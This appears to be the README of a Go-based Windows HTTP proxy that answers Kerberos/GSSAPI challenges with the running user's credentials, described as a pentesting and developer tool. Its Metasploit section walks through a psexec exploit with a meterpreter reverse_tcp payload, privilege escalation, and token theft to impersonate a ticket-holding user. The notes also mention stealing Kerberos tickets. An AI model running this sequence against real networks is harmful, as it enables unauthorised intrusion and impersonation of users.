Gssapi-proxy
============

Simple http proxy for Windows. Uses running user's kerberos login to respond to kerberos/GSSAPI challenges (401/Www-Authenticate) on behalf of the client. Potentially useful for pentesting, and developers working with kerberos/GSSAPI. Implemented in Go, using SSPI. Highly extensible.

Tested on Windows 8.1 (32-bit), with Heimdal KDC and MIT's implementation of GSSAPI libraries at the other end. Should run on Windows 2000+, and might fall back to NTLM if building kerberos context fails.

Building
--------

The following command should build the application. It is a little bit large, but it should not require any dependencies from target the systems.

```
go build src\gssapi-proxy.go
```

Metasploit example
------------------

The following example exploits an other user, and runs the proxy remotely.

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set rhost x.x.x.x
set smbdomain localdomain
set smbuser user
set smbpass password
exploit
# ... elevate to Administrator / SYSTEM
upload gssapi-proxy.exe /windows/system32/gssapi-proxy.exe
# Pick process that belongs to the user that has valid kerberos tickets!
ps
steal_token PID 
getuid
# Should show correct user
shell
cd /windows/system32/
gssapi-proxy.exe
# Should work, connect your browser to the proxy
# ....
# Reverse back to admin/system when you are done
rev2self
```

Notes
-----

* You must run the application as user that has valid kerberos login and tickets. Although they can later be stolen (at least WCE 1.2+ can do that) and moved to other computers, they can not initially be generated without authenticating against KDC.
* Only the most common flags are set when generating tokens. For instance delegation (ISC_REQ_DELEGATE) is not allowed for kerberos keys by default. Please see SSPI [documentation](http://msdn.microsoft.com/en-us/library/Windows/desktop/aa375509(v=vs.85).aspx) for more information if you run into problems.
* Does not reply to mutual authentication request, but it's probably somewhat rare to bump into with web applications.
* 64-bit platforms should still offer 32-bit compatible library/API so the application should compile and work. There's afaik no reason why the application should be 64-bit.
* The application does not add proxy headers, or manipulate any other headers besides Www-Authenticate/Authorization intentionally.
